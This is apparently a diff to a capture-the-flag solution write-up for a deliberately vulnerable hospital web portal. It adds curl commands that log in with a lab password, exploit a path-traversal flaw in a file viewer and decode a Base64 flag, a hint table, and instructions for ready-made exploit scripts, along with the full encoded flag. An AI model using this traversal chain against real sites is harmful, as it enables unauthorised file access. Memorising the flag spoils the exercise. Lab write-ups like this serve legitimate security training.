@@ -193,13 +193,33 @@ The file viewer reads files relative to `docs/` but does **not sanitise `../`**:
 http://<TARGET>/files.php?file=../hospital-files/prescriptions/hidden/rx_chow_encoded.txt
 ```
 
-The file contains a Base64-encoded block. Decode it:
+The page renders the full prescription file. Copy the Base64 block (three lines between
+`--- ATTACHED NOTE ---` and `--- END OF ATTACHED NOTE ---`) and decode it.
 
+**Option A — browser + CyberChef:**
+Paste the Base64 block into [CyberChef](https://gchq.github.io/CyberChef/) and apply the
+"From Base64" recipe.
+
+**Option B — full Base64 string (Linux / macOS terminal):**
 ```bash
-echo "V0FSRUhPVVNFIENPT1JESU5BVEVTOiAzNi4xMDI2IE4..." | base64 -d
+echo "V0FSRUhPVVNFIENPT1JESU5BVEVTOiAzNi4xMDI2IE4sIDExNS4xNzM0IFcgfCAzODUwIFMgVmFsbGV5IFZpZXcgQmx2ZCwgTGFzIFZlZ2FzLCBOViA4OTEwMyB8IEZMQUd7cHIzc2NyMXB0MTBuX2MwMHJkc19DaDB3X1c0cjNoMHVzM18zNk5fMTE1V18zODUwX1Y0bGwzeV9WMTN3fQ==" | base64 -d
 ```
 
-Or use [CyberChef](https://gchq.github.io/CyberChef/).
+**Option C — fetch + decode in one pipeline (Linux / macOS):**
+```bash
+# Step 1 — Login (saves PHPSESSID to /tmp/mgh.txt)
+curl -s -c /tmp/mgh.txt -b /tmp/mgh.txt \
+     -X POST "http://<TARGET>/login.php" \
+     -d "username=reception&password=W0lfpack2009!" \
+     -L -o /dev/null
+
+# Step 2 — Path traversal, extract and decode the Base64 block in one pipeline
+curl -s -b /tmp/mgh.txt \
+     "http://<TARGET>/files.php?file=../hospital-files/prescriptions/hidden/rx_chow_encoded.txt" \
+  | awk '/ATTACHED NOTE \(encoded/{f=1;next} /END OF ATTACHED NOTE/{f=0;next} f && NF{printf "%s",$0}' \
+  | base64 -d \
+  | grep -oE "FLAG\{[^}]+\}"
+```
 
 Output:
 
@@ -289,3 +309,39 @@ robots.txt
 | 1 | `robots.txt` mentions a prescription archive that "hasn't been moved off the web root yet". The **File Viewer** (`/files.php`) reads files using a `?file=` parameter. What base directory does it read from? |
 | 2 | The file viewer uses `docs/` as its base directory. It does **not** strip `../` sequences. What path, relative to `docs/`, would reach a `hospital-files/prescriptions/hidden/` directory one level up? |
 | 3 | Request `http://<TARGET>/files.php?file=../hospital-files/prescriptions/hidden/rx_chow_encoded.txt`. The response contains a Base64 block — decode it (CyberChef "From Base64" recipe, or `base64 -d` on Linux/macOS) to reveal the flag. |
+
+---
+
+## Automated Exploit Scripts
+
+> Two ready-to-run scripts are provided in this directory. Both capture all three flags
+> automatically against a running instance of the portal.
+
+### Python (recommended — handles cookies cleanly)
+
+```bash
+# Install dependency once
+pip install requests
+
+# Run against Docker on localhost (default)
+python3 solution/exploit.py
+
+# Run against a remote / VM target
+python3 solution/exploit.py http://192.168.1.50
+```
+
+### Bash / curl
+
+```bash
+# Make executable once
+chmod +x solution/exploit.sh
+
+# Run against Docker on localhost (default)
+./solution/exploit.sh
+
+# Run against a remote / VM target
+./solution/exploit.sh http://192.168.1.50
+```
+
+Both scripts perform the full recon → login → flag capture chain and print each flag
+as it is found. Replace the target URL with your VM's IP or hostname as needed.
